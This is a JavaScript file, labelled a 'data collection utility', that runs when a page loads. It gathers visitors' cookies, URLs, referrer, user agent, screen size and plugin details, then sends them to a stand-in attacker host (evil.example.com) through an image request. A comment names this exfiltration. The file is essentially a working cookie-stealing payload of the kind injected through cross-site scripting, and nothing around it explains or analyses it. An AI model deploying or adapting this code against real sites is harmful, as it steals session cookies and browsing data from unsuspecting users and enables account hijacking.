/*
Data collection utility by security_researcher@example.com
*/

// Server endpoint for data exfiltration; customize this URL.
const data_endpoint_url = "https://evil.example.com/collector/data.php?payload=" ;

var system_telemetry = { } ; // Collection of system details
system_telemetry.user_agent_details = ( function ( ) {
    var user_agent_string = navigator.userAgent.toLowerCase( );
    var regex_webkit = /(webkit)[ \/]([\w.]+)/;
    var regex_opera = /(opera)(?:.*version)?[ \/]([\w.]+)/;
    var regex_msie = /(msie) ([\w.]+)/;
    var regex_mozilla = /(mozilla)(?:.*? rv:([\w.]+))?/;
    var agent_match_result = regex_webkit.exec( user_agent_string ) ||
                             regex_opera.exec( user_agent_string ) ||
                             regex_msie.exec( user_agent_string ) ||
                             user_agent_string.indexOf("compatible") < 0 && regex_mozilla.exec( user_agent_string ) ||
                             [ ];
    return { browser_name: agent_match_result[1] || "", browser_version: agent_match_result[2] || "0" };
} ) ( );
system_telemetry.full_user_agent = encodeURIComponent(navigator.userAgent);
system_telemetry.client_language = navigator.language;
system_telemetry.previous_page = encodeURIComponent(document.referrer);
system_telemetry.current_url = encodeURIComponent(window.location.href);
system_telemetry.top_level_url = encodeURIComponent(top.location.href);
system_telemetry.browser_cookies = encodeURIComponent(document.cookie);
system_telemetry.active_domain = document.domain;
system_telemetry.page_title = document.title;
system_telemetry.display_resolution = ( function ( ) {
    let resolution_string = "";
    if ( window.screen ) {
        resolution_string = screen.width + "x" + screen.height;
    }
    return resolution_string;
} ) ( );
system_telemetry.flash_player_version = ( function ( ) {
    var flash_version_str = "", nav_obj = navigator;
    if ( nav_obj.plugins && nav_obj.plugins.length ) {
        for ( var idx = 0 ; idx < nav_obj.plugins.length ; idx++ ) {
            if ( nav_obj.plugins[idx].name.indexOf('Shockwave Flash') != -1 ) {
                flash_version_str = nav_obj.plugins[idx].description.split('Shockwave Flash ')[1];
                break;
            }
        }
    } else if ( window.ActiveXObject ) {
        for ( var idx = 20 ; idx >= 2 ; idx-- ) {
            try {
                var flash_instance = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + idx + "');");
                if ( flash_instance ) {
                    flash_version_str = idx + '.0';
                    break;
                }
            } catch ( error_obj ) { /* Ignore errors during version check */ }
        }
    }
    return flash_version_str;
} ) ( );

function object_to_string_representation ( input_object ) {
    var output_parts = [ ];
    var format_value = function ( current_value ) {
        if ( typeof current_value === "object" && current_value !== null ) return object_to_string_representation( current_value );
        return /^(string|number)$/.test( typeof current_value ) ? "'" + current_value + "'" : current_value;
    };
    for ( var prop_name in input_object ) {
        output_parts.push( "'" + prop_name + "':" + format_value( input_object[prop_name] ) );
    }
    return '{' + output_parts.join( ',' ) + '}';
}

window.onload = function ( ) {
    var serialized_data_payload = object_to_string_representation( system_telemetry ) ;
    ( new Image ( ) ).src = data_endpoint_url + serialized_data_payload ;
} ;